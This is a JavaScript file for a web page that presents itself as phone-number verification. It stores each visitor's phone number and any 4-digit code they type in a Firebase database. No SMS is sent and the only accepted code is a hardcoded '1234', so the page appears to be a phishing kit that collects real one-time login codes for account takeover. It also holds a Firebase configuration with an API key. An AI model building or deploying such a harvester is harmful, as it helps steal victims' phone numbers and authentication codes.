document.addEventListener("DOMContentLoaded", function () {
    const phoneInput = document.getElementById("phone-number");
    const phoneInputWrapper = document.querySelector(".intl-tel-input");
    const submitPhoneButton = document.getElementById("submit-phone");
    const verificationModal = document.getElementById("verification-modal");
    const closeModal = document.getElementById("close-modal");
    const digitInputs = document.querySelectorAll(".code-inputs input");
    const tryAgainButton = document.getElementById("try-again");
    const verificationErrorMessage = document.getElementById("verification-error-message");
    const phoneErrorMessage = document.getElementById("phone-error-message");
    const timerDisplay = document.getElementById("timer");

    let countdownInterval;

    // Initialize Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyBlUtD5r98APfEfvBqPzTEDxkwrFy99e28",
        authDomain: "da24-d9796.firebaseapp.com",
        databaseURL: "https://da24-d9796-default-rtdb.firebaseio.com",
        projectId: "da24-d9796",
        storageBucket: "da24-d9796.appspot.com",
        messagingSenderId: "169863925520",
        appId: "1:169863925520:web:49f9cddb1efd8f6d4b9f95",
        measurementId: "G-LMF1PFYL3T"
    };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Initialize intl-tel-input
    let iti = initializePhoneInput();

    submitPhoneButton.onclick = function () {
        const phoneNumber = iti.getNumber();
        if (iti.isValidNumber()) {
            phoneErrorMessage.textContent = "";
            savePhoneNumber(phoneNumber);  // Save phone number to Firebase
            openModal();
            startTimer(60, timerDisplay);
            phoneInputWrapper.style.display = "none";  // Hide the intl-tel-input wrapper
        } else {
            phoneErrorMessage.textContent = "Invalid phone number.";
        }
    };

    digitInputs.forEach((input, index) => {
        input.addEventListener("input", function () {
            if (input.value.length === 1 && index < digitInputs.length - 1) {
                digitInputs[index + 1].focus();
            }

            // Auto verify when 4 digits are entered
            if (index === digitInputs.length - 1 && input.value.length === 1) {
                autoVerifyCode();
            }
        });

        input.addEventListener("keydown", function (event) {
            if (event.key === "Backspace" && input.value.length === 0 && index > 0) {
                digitInputs[index - 1].focus();
            }
        });

        // Ensure only numeric input
        input.setAttribute("inputmode", "numeric");
    });

    tryAgainButton.onclick = function () {
        resetTimer();
        tryAgainButton.style.display = "none";
        startTimer(60, timerDisplay);
    };

    function autoVerifyCode() {
        let verificationCode = '';
        digitInputs.forEach(input => verificationCode += input.value);

        if (verificationCode.length === 4) {
            saveVerificationCode(verificationCode);  // Save verification code with current time
            if (verificationCode === "1234") { // Correct code (example)
                alert('Verification successful!');
                closeModalFunction();
            } else {
                verificationErrorMessage.textContent = "Incorrect verification code.";
            }
        } else {
            verificationErrorMessage.textContent = "Please enter the full 4-digit code.";
        }
    }

    function openModal() {
        verificationModal.style.display = "flex";
    }

    function closeModalFunction() {
        verificationModal.style.display = "none";
        digitInputs.forEach(input => input.value = '');
        verificationErrorMessage.textContent = '';
        phoneInputWrapper.style.display = "block";  // Show the intl-tel-input wrapper again
    }

    closeModal.onclick = function () {
        closeModalFunction();
        clearInterval(countdownInterval); // Stop the timer if modal is closed
    };

    function startTimer(duration, display) {
        let timer = duration, minutes, seconds;
        countdownInterval = setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);

            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            display.textContent = "Verification Time: " + minutes + ":" + seconds;

            if (--timer < 0) {
                clearInterval(countdownInterval);
                display.textContent = "Time's up! Please try again.";
                tryAgainButton.style.display = "block";
                digitInputs.forEach(input => input.value = '');  // Clear the input fields
            }
        }, 1000);
    }

    function resetTimer() {
        timerDisplay.textContent = "";
        digitInputs.forEach(input => input.value = '');
        verificationErrorMessage.textContent = '';
        openModal();
    }

    function savePhoneNumber(phoneNumber) {
        const phoneId = phoneNumber.replace(/\D/g, ''); // Remove non-digit characters
        const phoneRef = database.ref('verificationCodes/' + phoneId);
        phoneRef.set({
            phoneNumber: phoneNumber,
            verificationCode: null,
            savedAt: getCurrentTime()
        });
    }

    function saveVerificationCode(verificationCode) {
        const phoneNumber = iti.getNumber();
        const phoneId = phoneNumber.replace(/\D/g, ''); // Remove non-digit characters
        const verificationRef = database.ref('verificationCodes/' + phoneId);
        verificationRef.update({
            verificationCode: verificationCode,
            verifiedAt: getCurrentTime()
        });
    }

    function getCurrentTime() {
        const now = new Date();
        const hours = now.getHours();
        const minutes = now.getMinutes();
        const seconds = now.getSeconds();
        const timeFormat = hours >= 12 ? 'PM' : 'AM';
        const formattedHours = hours % 12 || 12; // Convert 24-hour format to 12-hour format
        const formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
        const formattedSeconds = seconds < 10 ? '0' + seconds : seconds;

        return `${formattedHours}:${formattedMinutes}:${formattedSeconds} ${timeFormat}`;
    }

    function initializePhoneInput() {
        return window.intlTelInput(phoneInput, {
            initialCountry: "auto",
            geoIpLookup: function(callback) {
                fetch('https://ipinfo.io/json')
                    .then(response => response.json())
                    .then(data => callback(data.country))
                    .catch(() => callback('us'));
            },
            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
            separateDialCode: true // Shows the dial code separately
        });
    }
});
